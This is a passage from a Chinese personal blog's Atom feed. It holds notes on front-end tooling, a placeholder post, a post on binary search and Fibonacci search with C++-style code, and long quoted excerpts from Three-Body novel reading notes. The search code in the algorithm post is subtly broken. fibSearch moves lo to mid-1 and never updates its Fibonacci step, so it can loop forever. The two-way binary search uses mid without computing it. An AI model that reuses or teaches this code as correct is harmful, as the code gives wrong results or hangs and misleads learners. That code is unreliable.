<h3 id="持续集成"><a href="#持续集成" class="headerlink" title="持续集成"></a>持续集成</h3><h3 id="自动化构建"><a href="#自动化构建" class="headerlink" title="自动化构建"></a>自动化构建</h3><h3 id="自动化部署"><a href="#自动化部署" class="headerlink" title="自动化部署"></a>自动化部署</h3><h3 id="自动化测试"><a href="#自动化测试" class="headerlink" title="自动化测试"></a>自动化测试</h3><p>前端自动化测试能够提高代码质量、减少人肉测试等，这些优点是不言而喻的。<br>市面上前端测试框架有很多，选择哪个都不会有太大问题，我们用的是：<br><code>Karma</code>  + <code>Mocha</code>  + <code>Chai</code> </p>
<h3 id="构建工具"><a href="#构建工具" class="headerlink" title="构建工具"></a>构建工具</h3><p>最后就是你的团队可能不只一个项目，如果每个项目都搭一套gulp+webpack+babel+…，维护成本比较高，而且不能保证统一性。</p>
<p>因此基于Gulp实现一套独立于项目的构建工具是最好的解决方案。</p>
<p>可以参考一下我们网易蜂巢的构建工具rainfore/pursuit-cli，开发者只要会用pursuit dev和pursuit online两句命令就行。</p>
<p>下图是我们的构建工具任务流。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>下面是我前段时间写的一篇文章《网易蜂巢的工业化前端架构》，用微信扫一扫。以网易蜂巢下的五个单页系统（SPA）为例，详细讲述了我们组前端工程化的一些细节。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;谁能介绍下web前端工程化？&quot;&gt;&lt;a href=&quot;#谁能介绍下web前端工程化？&quot; class=&quot;headerlink&quot; title=&quot;谁能介绍下web前端工程化？&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://www.zhihu.com/question/2455
    
    </summary>
    
      <category term="web" scheme="http://www.wanglinzhizhi.me/categories/web/"/>
    
    
      <category term="架构" scheme="http://www.wanglinzhizhi.me/tags/%E6%9E%B6%E6%9E%84/"/>
    
      <category term="体系架构" scheme="http://www.wanglinzhizhi.me/tags/%E4%BD%93%E7%B3%BB%E6%9E%B6%E6%9E%84/"/>
    
      <category term="Web 架构" scheme="http://www.wanglinzhizhi.me/tags/Web-%E6%9E%B6%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>结构与样式分离</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/%E7%BB%93%E6%9E%84%E4%B8%8E%E6%A0%B7%E5%BC%8F%E5%88%86%E7%A6%BB/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/结构与样式分离/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="结构与样式分离"><a href="#结构与样式分离" class="headerlink" title="结构与样式分离"></a>结构与样式分离</h2><p><strong>结构与样式分离</strong></p>
<p><strong>结构与样式分离</strong></p>
<p><strong>结构与样式分离</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;结构与样式分离&quot;&gt;&lt;a href=&quot;#结构与样式分离&quot; class=&quot;headerlink&quot; title=&quot;结构与样式分离&quot;&gt;&lt;/a&gt;结构与样式分离&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;结构与样式分离&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;结构与样式分离&lt;/s
    
    </summary>
    
      <category term="前端架构" scheme="http://www.wanglinzhizhi.me/categories/%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%9E%84/"/>
    
    
      <category term="前端架构" scheme="http://www.wanglinzhizhi.me/tags/%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%9E%84/"/>
    
      <category term="架构" scheme="http://www.wanglinzhizhi.me/tags/%E6%9E%B6%E6%9E%84/"/>
    
      <category term="页面结构" scheme="http://www.wanglinzhizhi.me/tags/%E9%A1%B5%E9%9D%A2%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>算法：BinarySearch和FibSearch</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/%E7%AE%97%E6%B3%95%EF%BC%9ABinarySearch%20%20%E5%92%8C%20FibSearch/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/算法：BinarySearch  和 FibSearch/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="算法：BinarySearch-和-FibSearch"><a href="#算法：BinarySearch-和-FibSearch" class="headerlink" title="算法：BinarySearch  和 FibSearch"></a>算法：BinarySearch  和 FibSearch</h2><hr>

<p>​<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">binarySearch(<span class="keyword">int</span>[] A,<span class="keyword">int</span> e,<span class="keyword">int</span> lo,<span class="keyword">int</span> hi)&#123;</div><div class="line">  <span class="keyword">while</span>(lo&lt;hi)&#123;</div><div class="line">  	<span class="keyword">int</span> mid=(lo+hi)/<span class="number">2</span>;</div><div class="line">    <span class="keyword">if</span>(e&lt;A[mid])</div><div class="line">      hi=mid;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(A[mid]&lt;e)</div><div class="line">      lo=mid+<span class="number">1</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">      <span class="keyword">return</span> mid;</div><div class="line">  &#125;<span class="comment">//while end</span></div><div class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;<span class="comment">//code end</span></div><div class="line"></div><div class="line">​</div></pre></td></tr></table></figure></p>
<p>以上是简单的二分查找，对于有序数列，我们常用的是二分查找对其进行遍历，查找到相应所需要的元素的位置。当元素不存在时，返回-1.</p>
<p>算法的时间复杂度是我们愿意欣然接受的O(logn).</p>
<p>这就是最好的了吗？不是，还有比二分查找更好的算法FibSearch。</p>
<p>​<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">fibSearch</span><span class="params">(<span class="keyword">int</span>[] A,<span class="keyword">int</span> e,<span class="keyword">int</span> lo,<span class="keyword">int</span> hi)</span></span>&#123;</div><div class="line">  <span class="function">Fib <span class="title">fib</span><span class="params">(hi-lo)</span></span>;</div><div class="line">  <span class="keyword">while</span>(lo&lt;hi)&#123;</div><div class="line">    <span class="keyword">int</span> mid=lo+fib.get()<span class="number">-1</span>;</div><div class="line">    <span class="keyword">if</span>(e&lt;A[mid]) hi=mid;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(A[mid]&lt;e) lo=mid<span class="number">-1</span>;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">return</span> mid;</div><div class="line">  &#125;<span class="comment">//while end</span></div><div class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;<span class="comment">//code end</span></div><div class="line"></div><div class="line"><span class="comment">//Fibonacci 类</span></div><div class="line"><span class="keyword">class</span> Fib &#123; <span class="comment">//Fibonacci数列类</span></div><div class="line"><span class="keyword">private</span>:</div><div class="line">   <span class="keyword">int</span> f, g; <span class="comment">//f = fib(k - 1), g = fib(k)。均为int型，很快就会数值溢出</span></div><div class="line"><span class="keyword">public</span>:</div><div class="line">   Fib ( <span class="keyword">int</span> n ) <span class="comment">//初始化为不小于n的最小Fibonacci项</span></div><div class="line">   &#123; f = <span class="number">1</span>; g = <span class="number">0</span>; <span class="keyword">while</span> ( g &lt; n ) next(); &#125; <span class="comment">//fib(-1), fib(0)，O(log_phi(n))时间</span></div><div class="line">   <span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">()</span>  </span>&#123; <span class="keyword">return</span> g; &#125; <span class="comment">//获取当前Fibonacci项，O(1)时间</span></div><div class="line">   <span class="function"><span class="keyword">int</span> <span class="title">next</span><span class="params">()</span> </span>&#123; g += f; f = g - f; <span class="keyword">return</span> g; &#125; <span class="comment">//转至下一Fibonacci项，O(1)时间</span></div><div class="line">   <span class="function"><span class="keyword">int</span> <span class="title">prev</span><span class="params">()</span> </span>&#123; f = g - f; g -= f; <span class="keyword">return</span> g; &#125; <span class="comment">//转至上一Fibonacci项，O(1)时间</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>以上是fibSearch的基本代码。</p>
<p>事实上，从代码可以看出，fibSearch的算法是基于二分查找的结构之上的。区别在于，每次对mid定位不再是取中点，而是取黄静分割点。这样做对性能的影响是，原来的二分查找BinarySearch的平均复杂段是 1.5*logn，可减低前面的常系数 1.5 降到 黄金分割率 (约为1.44）.</p>
<p>之所以会是这样，是因为 binarySearch 中左右两边分支时，进行的比较次数时不同的，左边比较次数比右边的比较次数少，那么虽然每次是平均从中间截断，但是效果并不是分摊，而是后面分摊的比较次数更多。所以可以用fibSearch将比较次数更少的左边截取更长的长度，这有点类似于哈夫曼编码的方式，将较小权值的分支分更深，而将将较大权值的分支放在更浅的位置已达到整体的权值最小。</p>
<p>另外一个发现是关于fibonacci数列的。以前只知道有 Fibonacci数列，但是没有想过它的用途，现在发现这货还是很有用的。而且原来Fibonacci 数列与黄金分割点之间存在相关关系。</p>
<p>tips，fibonacci数列千万不要使用递归来构造。 :)</p>
<hr>

<p>###update 2016.02.27</p>
<p>之前一直很忙（懒）导致之前貌似有个与二分查找有极大相关性的一个话题的个人领悟想写一写的，然而，现在忘了。。。</p>
<p>好吧，还是先记录下我现在想些的内容吧：</p>
<ol>
<li><p>对于比较次数的锱铢必较。其实上面的BinSearch算法如果不仔细考虑比较次数的问题，其实性能提升就无从谈起，我记得以前在复习《数据结构》这门课程的时候，做算法题很不理解为什么经常会有比较不同算法之间的比较次数的多少，觉得很无聊。（总觉得比较不同算法之间交换元素的次数的不同很容易理解，因为毕竟交换元素有的时候开销是明明白白摆在那里的，但是就比较次数有什么好计较的？？？），现在才知道当年还是太年轻。</p>
<p>我在闲着无聊的时候重新看了一下数据结构的内容，如果针对比较次数的限制，我们对BinSearch算法是可以进一步优化的，即使在向右跳转的时候和向左跳转方向都只需要相同的比较次数的思路。</p>
<p>怎么做呢？具体说来，其实只需要做及其微小的变化就可以了。mid=(low+high)/2;只是现在不需要进行A[mid]进行三次比较(大于，小于，等于)。而是将只考虑两种情况：a：e &lt; A[mid], b：A[mid]&lt;=e;</p>
<blockquote>
   <figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">&gt;</div><div class="line">&gt;    ( e &lt; A[mid] ) ? high = mid : low = mid;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>&gt;</p>
<p>这样处理之后，算法中分支向左或向右都只需要1次比较。那么就出现了新的问题，这样做算法什么时候终止呢？是的，终止条件发生了变化，不再是当遍历到我们需要的e==A[mid]的时候返回，而是在折半到最后low&lt;high 才终止。也就是说，当e与A[mid]比较之后，将向量分为两部分[lo, mi)或[mi, hi),每一次比较从这两部分中选择一边深入下去，相同的故事一直进行直到最后不满足low&lt;high 循环条件才退出。</p>
<p>DSA如下：</p>
<blockquote>
   <figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">&gt;</div><div class="line">&gt;     binSearchAgl2(<span class="keyword">int</span>[] A,<span class="keyword">int</span> e,<span class="keyword">int</span> low,<span class="keyword">int</span> high)&#123;</div><div class="line">&gt;       <span class="keyword">while</span>(low&lt;high)&#123;</div><div class="line">&gt;         ( e &lt; A[mid] ) ? high = mid : low = mid;</div><div class="line">&gt;       &#125;<span class="comment">//while end</span></div><div class="line">&gt;       <span class="keyword">if</span>(e ==A[mid])</div><div class="line">&gt;         <span class="keyword">return</span> mid;</div><div class="line">&gt;       <span class="keyword">else</span></div><div class="line">&gt;         <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&gt;     &#125;<span class="comment">//code end</span></div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>&gt;</p>
<p>这样做是否值得呢？优点不难看出，随着比较次数的减少，整体效率会有所上升，但是缺点也很明显，最好情况和最坏情况一样，都是等于平均情况下的效率。</p>
<p>对于上述三种排序思路，如何选择最优呢？和小时候做数学题一样，分情况讨论，二分排序问题，是输入敏感型的，对输入的向量（为简单，假设为向量）很敏感。</p>
<p>对于输入的向量，如果出现最好和最坏现象比较频繁，数据分布有明显的聚集现象，那么很显然，binSearch不是最好的选择，应该选择更看重平均效率的算法。</p>
<p>反之，对于有序数据向量来说，数据在向量中分布均匀，那么经典的binSearch将会是适合的。</p>
</li>
<li><p>好吧，终于到第二了，这次说什么都要先把主要的观点记下来，免得又忘了。</p>
<p>第二，是关于在数据结构中二分搜索的地位的评价的。</p>
<p>这几天闲着无聊，感觉什么都不做太浪费宝贵的人生了，于是我就把数据结构重新遍历了一边，个人观点，二分查找，基本上串连了整个数据结构的内容。类似一根穿针线，在整个数据结构中，时隐时现，重最初的向量的二分查找，到后面树的查找，再到BST(二叉平衡树)的查找算法，再到B-Tree，虽然拓扑结构和逻辑结构上有些不同，但是吧，说实话其实思路倒还真是——起码我觉得——差不多。具体的思路缕析慢慢来，先补另外几篇……</p>
<p>​</p>
</li>
</ol>
<p>​</p>
<p>​</p>
<p>参考资料：《数据结构》 邓俊辉 清华大学出版社</p>
<p>by wanglinzhizhi</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;算法：BinarySearch-和-FibSearch&quot;&gt;&lt;a href=&quot;#算法：BinarySearch-和-FibSearch&quot; class=&quot;headerlink&quot; title=&quot;算法：BinarySearch  和 FibSearch&quot;&gt;&lt;/a&gt;算法：B
    
    </summary>
    
      <category term="算法" scheme="http://www.wanglinzhizhi.me/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="数据结构" scheme="http://www.wanglinzhizhi.me/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
      <category term="程序员的浪漫" scheme="http://www.wanglinzhizhi.me/tags/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB/"/>
    
      <category term="C++" scheme="http://www.wanglinzhizhi.me/tags/C/"/>
    
      <category term="二分查找" scheme="http://www.wanglinzhizhi.me/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
    
      <category term="Fibonacci查找" scheme="http://www.wanglinzhizhi.me/tags/Fibonacci%E6%9F%A5%E6%89%BE/"/>
    
      <category term="查找算法" scheme="http://www.wanglinzhizhi.me/tags/%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/"/>
    
      <category term="DSA" scheme="http://www.wanglinzhizhi.me/tags/DSA/"/>
    
  </entry>
  
  <entry>
    <title>三体 读书笔记</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/%E4%B8%89%E4%BD%93%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/三体读书笔记/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="三体-读书笔记"><a href="#三体-读书笔记" class="headerlink" title="三体 读书笔记"></a>三体 读书笔记</h2><blockquote>
<p>   Note:以前是在前大一(重庆,2010年吧),在小高同学的推荐下看了三体第三部,那次一口气连续几天在寝室的床上窝着把第三册看完了,真心被震撼了.当时的刘慈欣和三体还不像这几年这么热烈的讨论着.当时被那种宏大彻底震撼到.后来就陆续买了纸质版书.后来在手机上又买了电子书.这段时间闲着,就从头读起,算不上笔记,其实就是书中的一些看着比较有感触的段落,导出来比较容易,然后就把笔记导出,想想放到这里.反正是自己的地方,闲着也闲着,当备份也行.也免得博客长草了。</p>
</blockquote>
<hr>



<p>刘慈欣</p>
<p>\1. 科学边界</p>
<p>2015-11-11</p>
<p>你很快就会知道一切的，所有人都会知道。汪教授，你的人生中有重大的变故吗？这变故突然完全改变了你的生活，对你来说，世界在一夜之间变得完全不同。”</p>
<p>“没有。”</p>
<p>“那你的生活是一种偶然，世界有这么多变幻莫测的因素，你的人生却没什么变故。”</p>
<p>汪淼想了半天还是不明白，“大部分人都是这样嘛。”</p>
<p>“那大部分人的人生都是偶然。”</p>
<p>2015-11-11</p>
<p>都是偶然。”</p>
<p>2015-11-11</p>
<p>是的，整个人类历史也是偶然，从石器时代到今天都没什么重大变故，真幸运。但既然是幸运，总有结束的一天；现在我告诉你，结束了，做好思想准备吧</p>
<p>\2. 台球</p>
<p>2015-11-11</p>
<p>这就意味着宇宙普适的物理规律不存在，那物理学……也不存在了。</p>
<p>\4. 三体、周文王、长夜</p>
<p>2015-11-12</p>
<p>只有一个简单得不能再简单的“C:＞”提示符在闪动，你输入什么它就输出什么，一个字都不会多，也不会有变化。现在他知道，“C:＞”提示符后面其实是一个无底深渊。</p>
<p>\5. 叶文洁</p>
<p>2015-11-12</p>
<p>汪淼说明来意后，她露出发自内心的感动，她是汪淼常见到的那种老知识分子，岁月的风霜已消去了他们性情中所有的刚硬和火热，只剩下如水的柔和。</p>
<p>2015-11-12</p>
<p>他在门前停住了，突然被一种奇异的感觉所淹没，仿佛回到了少年多梦的时节，一些如清晨露珠般晶莹脆弱的感受从记忆的深处中浮起，这里面有最初的伤感和刺痛，但都是玫瑰色的。</p>
<p>\7. 疯狂年代</p>
<p>2015-11-12</p>
<p>她挥舞着战旗，挥动着自己燃烧的青春，敌人将在这火焰中化为灰烬，理想世界明天就会在她那沸腾的热血中诞生……她陶醉在这鲜红灿烂的梦幻中，直到被一颗步枪子弹洞穿了胸膛，十五岁少女的胸膛是那么柔嫩，那颗子弹穿过后基本上没有减速，在她身后的空中发出一声啾鸣。年轻的红卫兵同她的旗帜一起从楼顶落下，她那轻盈的身体落得甚至比旗帜还慢，仿佛小鸟眷恋着天空。其实，比起另外一些人来，她还是幸运的，至少是在为理想献身的壮丽激情中死去。</p>
<p>\16. 三体、哥白尼、宇宙橄榄球、三日凌空</p>
<p>2015-12-31</p>
<p>是伽利略。”亚里士多德介绍说，“他主张应该从实验和观测中认识世界，一个工匠式的思想家，但他已取得的成果我们还是不得不正视。</p>
<p>\17. 三体问题</p>
<p>2015-12-31</p>
<p>高二时，一位数学老师注意到了我，那时候，中学教师中可是卧虎藏龙，“文革”中很多有才华的人都流落到中学去教书了，他就是这样一个人。</p>
<p>2015-12-31</p>
<p>大隐隐于市，要清静省心，自己就得空。我说我够空了，名利于我连浮云都算不上，你庙里那些僧人都比我有更多的凡心。长老摇摇头：空不是无，空是一种存在，你得用空这种存在填满自己。这话对我很有启发，后来想想，这根本不是佛家理念，倒像现代的某种物理学理论。长老也说了，他不会同我谈佛，理由与那位中学老师一样：对我这号人没用。</p>
<p>2015-12-31</p>
<p>第一天晚上，在寺院的小屋里我睡不着，没想到这世外桃源是如此的不舒服，被褥都在山雾中变潮了，床硬邦邦的。于是，为了催眠，我便试图按长老说的那样，用“空”来填充自己。我在意识中创造的第一个“空”是无际的太空，其中什么都没有，连光都没有，空空的。很快，我觉得这空无一物的宇宙根本不能使自己感到宁静，身处其中反而会感到一种莫名的焦躁不安，有一种落水者想随便抓住些什么东西的欲望。</p>
<p>于是我给自己在这无限的空间中创造了一个球体，不大的、有质量的球体。但感觉并没有好起来，那球体悬浮在“空”的正中（对于无限的空间，任何一处都是正中），那个宇宙中没有任何东西作用于它，它也没有任何东西可以作用。它悬在那里，永远不会做丝毫的运动，永远不会有丝毫的变化，真是对死亡最到位的诠释。</p>
<p>我创造了第二个球，与原来的球大小质量相等，它们的表面都是全反射的镜面，互相映着对方的像，映着除它自己之外宇宙中唯一的一个存在。但情况并没有好多少：如果球没有初始运动，也就是我的第一推动，它们很快会被各自的引力拉到一块，然后两个球互相靠着悬在那里一动不动，还是一个死亡的符号。如果有初始运动且不相撞，它们就会在各自引力作用下相互围绕着对方旋转，不管你怎样初始化，那旋转最后都会固定下来，永远不变，死亡的舞蹈。</p>
<p>我又引入了第三个球体，情况发生了令我震惊的变化。前面说过，任何图形在我的意识深处都是数字化的，前面的无球、一球和二球宇宙表现为一条或寥寥几条描述它的方程，像几片晚秋的落叶。但这第三个球体是点上了“空”之睛的龙，三球宇宙一下子变得复杂起来，三个被赋予了初始运动的球体在太空中进行着复杂的、似乎永不重复的运动，描述方程如暴雨般涌现，无休无止。我就这样进入梦乡，三球在梦中一直舞蹈着，无规律的永不重复的舞蹈。但在我的意识深处，这舞蹈是有节奏的，只是重复的周期无限长而已，这让我着迷，我要描述出这个周期的一部分或全部。</p>
<p>2015-12-31</p>
<p>当时不知道，学数学的不知道庞加莱是不对，但我不敬仰大师，自己也不想成大师，所以不知道。但就算当时知道庞加莱，我也会继续对三体问题的研究。全世界都认为这人证明了三体问题不可解，可我觉得可能是个误解，他只是证明了初始条件的敏感性，证明了三体系统是一个不可积分的系统，但敏感性不等于彻底的不确定，只是这种确定性包含着数量更加巨大的不同形态。现在要做的是找到一种新的算法。当时我立刻想到了一样东西：你听说过“蒙特卡洛法”吗？哦，那是一种计算不规则图形面积的计算机程序算法，具体做法是在软件中用大量的小球随机击打那块不规则图形，被击中的地方不再重复打击，这样，达到一定的数量后，图形的所有部分就会都被击中一次，这时统计图形区域内小球的数量，就得到了图形的面积，当然，球越小结果越精确。</p>
<p>这种方法虽然简单，却展示了数学中的一种用随机的蛮力对抗精确逻辑的思想方法，一种用数量得到质量的计算思想</p>
<p>2015-12-31</p>
<p>我对来这里的游客和香客都没什么好印象，那些游客根本不知道是来看什么的，只是东跑西窜地照相；而那些香客，看上去普遍比游客穷得多，都处于一种麻木的智力抑制状态</p>
<p>2015-12-31</p>
<p>其实我也不是那么超脱，这几天都是整夜睡不着，早上起来从这看到日出时，总觉得是日落。”他转向汪淼，沉默良久后说，“其实这一切都在于，上帝，或她说的主，自身难保了。”</p>
<p>\18. 三体、牛顿、冯·诺伊曼、秦始皇、三日连珠</p>
<p>2015-12-31</p>
<p>停下来！你们这两个无聊的人！你们就没有一点责任心吗？如果世界文明没有未来，你们那点荣誉算个屁</p>
<p>\23. 红岸之五</p>
<p>2016-01-01</p>
<p>一个光子脱离太阳可能需要一千年的时</p>
<p>\24. 红岸之六</p>
<p>2016-01-01</p>
<p>人类本质的思考，使叶文洁陷入了深重的精神危机。她首先面临的，是一种奉献目标的缺失，她曾是一个理想主义者，需要将自己的才华贡献给一个伟大的目标，现在却发现，自己以前做的一切全无意义，以后也不可能有什么有意义的追求。这种心态发展下去，她渐渐觉得这个世界是那样的陌生，她不属于这里，这种精神上的流浪感残酷地折磨着她，在组成家庭后，她的心灵反而无家可归了。</p>
<p>\27. 无人忏悔</p>
<p>2016-01-01</p>
<p>最近有一部电影，叫《枫》，不知你看过没有？结尾处，一个大人和一个小孩儿站在死于武斗的红卫兵墓前，那孩子问大人：他们是烈士吗？大人说不是；孩子又问：他们是敌人吗？大人说也不是；孩子再问：那他们是什么？大人说：是历史。”</p>
<p>2016-01-01</p>
<p>夕阳给叶文洁瘦弱的身躯投下长长的影子。在她的心灵中，对社会刚刚出现的一点希望像烈日下的露水般蒸发了，对自己已经做出的超级背叛的那一丝怀疑也消失得无影无踪，将宇宙间更高等的文明引入人类世界，终于成为叶文洁坚定不移的理想。</p>
<p>\31. 两个质子</p>
<p>2016-01-02</p>
<p>“我只想说明以下的事实：在宇宙间，一个技术文明等级的重要标志，是它能够控制和使用的微观维度。对于基本粒子的一维使用，从我们那些长毛裸体的祖先在山洞中生起篝火时就开始了，对化学反应的控制，就是在一维层次上操控微观粒子。当然，这种控制也是从低级到高级，从篝火到后来的蒸汽机，再到后来的发电机；现在，人类对微观粒子一维控制的水平已达到了顶峰，有了计算机，也有了你们的纳米材料。但这一切，都局限于对微观维度的一维控制，在宇宙间一个更高级的文明看来，篝火和计算机、纳米材料等等是没有本质区别的，同属于一个层次，这也是他们仍将人类看成虫子的原因——遗憾的是，他们是对的。</p>
<p>\32. 古筝行动</p>
<p>2016-01-03</p>
<p>那你为什么对其抱有那样的期望，认为它们能够改造和完善人类社会呢？</p>
<p>2016-01-03</p>
<p>如果他们能够跨越星际来到我们的世界，说明他们的科学已经发展到相当的高度，一个科学如此昌明的社会，必然拥有更高的文明和道德水准。</p>
<p>\33. 监听员</p>
<p>2016-01-03</p>
<p>“你向往的那种文明在三体世界也存在过，它们有过民主自由的社会，也留下了丰富的文化遗产，你能看到的只是极小一部分，大部分都被封存禁阅了。但在所有三体文明的轮回中，这类文明是最脆弱最短命的，一次不大的乱世纪灾难就足以使其灭绝。再看你想拯救的地球文明，那个在永远如春的美丽温室中娇生惯养的社会，如果放到三体世界，绝对生存不了一百万个三体时。”</p>
<p>2016-01-03</p>
<p>花朵虽然娇弱但是绚丽无比，她在天堂闲适中感受着自由和美。”</p>
<p>“如果三体文明最后占</p>
<p>\34. 智子</p>
<p>2016-01-03</p>
<p>七维视角的基本粒子，其复杂程度可能已经与三维空间中的三体星系相当；八维视角下，粒子是一个与银河系一样宏大浩渺的存在；当视角达到九维后，一个基本粒子内部结构的数量和复杂程度，已经相当于整个宇宙。至于更高的维度，我们的物理学家还无法探测，其复杂度我还想象不出来。”</p>
<p>\35. 虫子</p>
<p>2016-01-03</p>
<p>看看吧，这就是虫子，它们的技术与我们的差距，远大于我们与三体文明的差距。人类竭尽全力消灭它们，用尽各种毒剂，用飞机喷撒，引进和培养它们的天敌，搜寻并毁掉它们的卵，用基因改造使它们绝育；用火烧它们，用水淹它们，每个家庭都有对付它们的灭害灵，每个办公桌下都有像苍蝇拍这种击杀它们的武器……这场漫长的战争伴随着整个人类文明，现在仍然胜负未定，虫子并没有被灭绝，它们照样傲行于天地之间，它们的数量也并不比人类出现前少。把人类看做虫子的三体人似乎忘记了一个事实：虫子从来就没有被真正战胜过。</p>
<p>2016-01-03</p>
<p>太阳被一小片黑云遮住了，在大地上投下一团移动的阴影。这不是普遍的云，是刚刚到来的一大群蝗虫，它们很快开始在附近的田野上降落，三个人沐浴在生命的暴雨之中，感受着地球生命的尊严。丁仪和汪淼把手中拎着的两瓶酒徐徐洒到脚下的华北平原上，这是敬虫子的。</p>
<p>\36. 尾声·遗址</p>
<p>2016-01-03</p>
<p>叶文洁走到悬崖边，她曾在这里亲手结束了两个军人的生命。她并没有像其他同行的人那样眺望云海，而是把目光集中到一个方向，在那一片云层下面，有一个叫齐家屯的小村庄……</p>
<hr>

<h3 id="三体-2：黑暗森林"><a href="#三体-2：黑暗森林" class="headerlink" title="三体 2：黑暗森林"></a>三体 2：黑暗森林</h3><p>刘慈欣</p>
<p>危机纪年第3年，三体舰队距太阳系4.21光年</p>
<p>2016-01-04</p>
<p>“同志们，太空军的历程是十分漫长的，按初步预计，各学科的基础研究至少需要五十年，而大规模太空航行的各项关键技术，还需要一个世纪才能成熟到实用阶段；太空舰队从初建到达到预想规模，乐观的估计也需要一个半世纪。也就是说，太空军从组建到形成完整战斗力，需要三个世纪的时间。同志们，我想你们已经知道这意味着什么，我们在场的所有人都没有机会进入太空，更不可能在有生之年见到我们的太空舰队，甚至连一个可信的太空战舰模型都见不到。太空舰队的第一代指战员将在两个世纪后产生，而从这时再过两个半世纪，地球舰队将面对外星侵略者，那时在战舰上的，是我们的第十几代子孙</p>
<p>2016-01-04</p>
<p>当罗辑所乘的飞机飞越海岸时，在他一万米的下方，吴岳和章北海再次注视着建造中的“唐”号。在以前和以后所有的时间里，这是罗辑距这两位军人最近的一次</p>
<p>2016-01-05</p>
<p>不不，别说在哪儿！一知道在哪儿，世界就变得像一张地图那么小了；不知道在哪儿，感觉世界才广阔呢</p>
<p>2016-01-05</p>
<p>所淹</p>
<p>2016-01-05</p>
<p>和白蓉之间的距离也真的有实际的这么远了，他们沉默良久，这期间，细若游丝的电波穿过夜中的群山，维系着他们最后的联系</p>
<p>2016-01-05</p>
<p>是，很早的事了。”</p>
<p>“他现在在哪儿？”</p>
<p>罗辑听到白蓉轻笑了一声，“还能在哪儿？”</p>
<p>罗辑也笑了笑，“是啊，还能在哪儿……”</p>
<p>“好了，那你早点睡，再见。”白蓉说完挂断了电话，那跨越漫漫黑夜的细丝中断了，丝两端的人都有些悲哀，但也仅此而已。</p>
<p>2016-01-05</p>
<p>不是的，大部分人的爱情对象也只是存在于自己的想象之中。他们所爱的并不是现实中的她（他），而只是想象中的她（他），现实中的她（他）只是他们创造梦中情人的一个模板，他们迟早会发现梦中情人与模板之间的差异，如果适应这种差异他们就会走到一起，无法适应就分开，就这么简单。你与大多数人的区别在于：你不需要模板。”</p>
<p>2016-01-05</p>
<p>：不要去做忘掉她的努力，没有用的，但随着时间的推移，她对你生活的影响会越来越小的。其实你很幸运，不管她是不是真的存在，能爱就很幸运了。”</p>
<p>2016-01-05</p>
<p>罗辑知道，自己心灵中最僻静的疆土已经属于她了，她将在那里伴随他一生。他甚至能清晰地看到她所在的世界，那是一片宁静的雪原，那里的天空永远有银色的星星和弯月，但雪也在不停地下着，雪原像白砂糖般洁白平润，静得仿佛能听到雪花落在上面的声音。她就在雪原上一间精致的小木屋中，这个罗辑用自己思想的肋骨造出的夏娃，坐在古老的壁炉前，静静地看着跳动的火焰。</p>
<p>2016-01-05</p>
<p>然后三人都沉默了，房间里一片寂静，罗辑能清楚地听到自己心跳的声音。以后他才知道，这个房间就叫默思室，那块重六吨的石头是高纯度生铁矿石，用以象征永恒和力量，是瑞典赠送的礼物。但现在，罗辑不想默思，而是努力做到什么都不想，因为现在真的可以相信大史说过的话：怎么想都会想歪的。为了做到这一点，他开始数那幅抽象画上几何形状的数量。</p>
<p>2016-01-13</p>
<p>以后的会议都有些什么内容，罗辑全然不知，他只知道自己站了一会儿后就被人领着走下了主席台，同另外三位面壁者一起坐在了第一排的中央，他在迷茫中错过了宣布面壁计划启动的历史性时刻。</p>
<p>2016-01-13</p>
